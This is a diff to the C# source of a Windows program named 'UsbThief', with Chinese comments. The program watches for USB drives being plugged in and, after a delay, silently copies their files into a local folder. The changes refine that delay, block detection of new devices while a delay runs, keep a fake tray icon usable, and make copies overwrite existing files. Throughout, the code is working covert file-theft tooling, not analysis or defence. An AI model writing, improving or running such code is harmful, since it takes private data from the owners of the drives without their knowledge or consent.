@@ -24,6 +24,7 @@ namespace UsbThief
         public const int innerVer = 0;
         public string workspace = Application.StartupPath + @"\data\diskcache\files\";
         public bool fc2c = false;
+        public bool inDelay = false;
         public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
         public const int DBT_DEVICEARRIVAL = 0x8000;  //就是用来表示U盘可用的。一个设备或媒体已被插入一块，现在可用。
         public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //审批要求删除一个设备或媒体作品。任何应用程序也不能否认这一要求，并取消删除。
@@ -242,7 +243,7 @@ namespace UsbThief
                     int wp = m.WParam.ToInt32();
                     if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
                     {
-                        if (wp == DBT_DEVICEARRIVAL)
+                        if (wp == DBT_DEVICEARRIVAL && !inDelay)//不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
                         {
                             Thread copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
                             DriveInfo[] s = DriveInfo.GetDrives();
@@ -283,31 +284,15 @@ namespace UsbThief
                                         if (drive.VolumeLabel != conf.volLabel)
                                         {
                                             string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
-                                            if (conf.delay > 0 && conf.delay <= 600)
+                                            if (conf.delay > 0 && conf.delay <= 500)
                                             {
-                                                notifyIcon1.Visible = false;
-                                                //HideRealMenu(true);
                                                 logger.Info("复制将于" + conf.delay + "秒后开始");
-                                                Thread.Sleep(conf.delay * 1000);
-                                                DriveInfo[] ds = DriveInfo.GetDrives();
-                                                bool exist = false;
-                                                foreach (DriveInfo drv in ds)
+                                                Delay(conf.delay * 1000);
+                                                if (currentDevice.name == "none" && currentDevice.volLabel == "none" && currentDevice.ser == "none")
                                                 {
-                                                    if (drv.Name == currentDevice.name)
-                                                        exist = true;
-                                                    continue;
-                                                }
-                                                if (!exist && currentDevice.name != "none" && currentDevice.volLabel != "none" && currentDevice.ser != "none")
-                                                {
-                                                    logger.Info("在延迟期间Usb设备“" + currentDevice.ser + "”已拔出");
-                                                    currentDevice.name = "none";
-                                                    currentDevice.volLabel = "none";
-                                                    currentDevice.ser = "none";
-                                                    HideRealMenu(true);
+                                                    logger.Info("在延迟期间Usb设备已拔出");
                                                     return;
                                                 }
-                                                notifyIcon1.Visible = true;
-                                                //HideRealMenu();
                                             }
                                             WriteSta(currentDevice.ser, Status.copying);
                                             copyT.Start(para);
@@ -431,6 +416,21 @@ namespace UsbThief
                 logger.Error("发生异常：\n" + ex);
             }
             base.WndProc(ref m);
+        }
+        void Delay(int time_ms)//使用这个延迟方法，假的托盘图标可以正常使用。
+        {
+            inDelay = true;
+            DateTime last = DateTime.Now;
+            do
+            {
+                Application.DoEvents();
+                Thread.Sleep(10);
+                if (IsDisposed)
+                {
+                    break;
+                }
+            } while ((DateTime.Now - last).TotalMilliseconds < time_ms);
+            inDelay = false;
         }
         #endregion
         #region 读状态文件
@@ -636,7 +636,7 @@ namespace UsbThief
                                 {
                                     fc2c = true;
                                     logger.Info("正在复制文件：" + fsi.FullName);
-                                    File.Copy(fsi.FullName, targetFileName);
+                                    File.Copy(fsi.FullName, targetFileName, true);
                                 }
                             }
                         }
